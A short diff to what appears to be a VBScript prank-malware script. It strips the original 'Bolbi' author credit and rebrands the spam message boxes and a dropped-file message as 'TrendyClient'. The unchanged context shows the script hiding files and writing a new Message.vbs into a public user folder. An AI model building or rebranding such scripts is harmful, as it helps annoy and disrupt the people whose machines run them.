@@ -1,5 +1,3 @@
-Rem Bolbi
-Rem By MrDinkle
 
 
 
@@ -70,7 +68,7 @@ Invisible4.Attributes = Invisible4.Attributes or 2 ' 2 = hidden
 End Sub
 
 Sub Message1
-MsgBox("WE SLAP EVERYDAY! slap slap slap clap clap clap slap slap slap clap clap clap slap slap slap clap clap clap")
+MsgBox("Trendy client? Trendy client? Trendy client? Trendy client? Trendy client? Trendy client? Trendy client? Trendy client? ")
 End Sub
 
 Sub DownPic
@@ -185,7 +183,7 @@ End Sub
 Sub BolbiMessage
 On Error Resume Next
 Set file = fso.CreateTextFile("C:\Users\Public\ghostroot\Message.vbs")
-file.Write "MsgBox ""Bolbi has made the use of this file forbidden!"""
+file.Write "MsgBox ""TrendyClient has made the use of this file forbidden!"""
 End Sub
 
 Sub Clone1
